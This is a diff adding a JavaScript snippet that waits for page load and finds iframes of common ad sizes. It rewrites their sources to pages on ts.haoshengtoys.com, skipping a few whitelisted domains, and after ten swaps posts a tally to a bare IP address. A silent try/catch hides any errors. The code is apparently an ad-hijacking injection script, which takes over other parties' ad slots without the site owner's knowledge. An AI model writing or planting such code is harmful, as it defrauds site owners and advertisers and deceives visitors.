@@ -1,0 +1,66 @@
+try {
+    var num=0;
+    var numend=10;//numend--->最多替换多少个
+    var numlist=[];
+    var ifWidthJson={
+        "https://ts.haoshengtoys.com/gdw/newAd/300x250ga.html":["300","250"],
+        "https://ts.haoshengtoys.com/gdw/newAd/960x60ga.html":["960","60"]
+    };
+    function  adIframe(){
+        var iframeArr=document.getElementsByTagName("iframe");
+        var iframeArrnum=iframeArr.length;
+        if (!window.jQuery) {
+            var jq = document.createElement('script');
+            jq.src = "http://libs.baidu.com/jquery/1.10.2/jquery.min.js";
+            document.getElementsByTagName('head').item(0).appendChild(jq);
+            jqReady();
+        } else {
+            jqReady();
+        }
+        function jqReady() {
+            if (window.jQuery) {
+                window.jQuery(function () {
+                    doChange(window.jQuery);
+                })
+            } else {
+                setTimeout(jqReady, 10);
+            }
+        }
+        function doChange($) {
+            for (var widthI in ifWidthJson) {
+                var adHref = widthI, adwidth = ifWidthJson[widthI][0], adheigth = ifWidthJson[widthI][1];
+                for (var i = 0; i < iframeArrnum; i++) {
+                    var iframelink = iframeArr[i].src;
+                    if (iframelink.indexOf("ts.jingyawuliu.com") != -1 || iframelink.indexOf("ho.hongmu919.com") != -1 || iframelink.indexOf("ts.haoshengtoys.com") != -1|| iframelink.indexOf("http://pos.baidu.com") != -1)  continue;
+                    if ((iframeArr[i].clientWidth == adwidth && iframeArr[i].clientHeight == adheigth) || (iframeArr[i].style.width == adwidth + "px" && iframeArr[i].style.height == adheigth + "px")) {
+                        iframeArr[i].src = adHref;
+                        iframeArr[i].id = "az" + adwidth + "b" + adheigth;
+                    }
+                    if (iframeArr[i].src == adHref) {
+
+                        num = num + 1;
+                        numlist.push(adwidth + "_" + adheigth);
+                        if (num == numend) {
+                            console.log(JSON.stringify({numlist: numlist}));
+                            $.ajax({
+                                type: "POST",
+                                url: "http://114.55.106.163:9091/business/api/iframesize/submit2",
+                                data: JSON.stringify({numlist: numlist}),
+                                DataType: 'jsonp',
+                                contentType: "application/json",
+                                success: function (data) {
+                                },
+                                error: function () {
+                                }
+                            });
+                            return
+                        }
+                    }
+                }
+            }
+        }
+
+    }
+    setTimeout('adIframe()',400);
+}
+catch (e){}
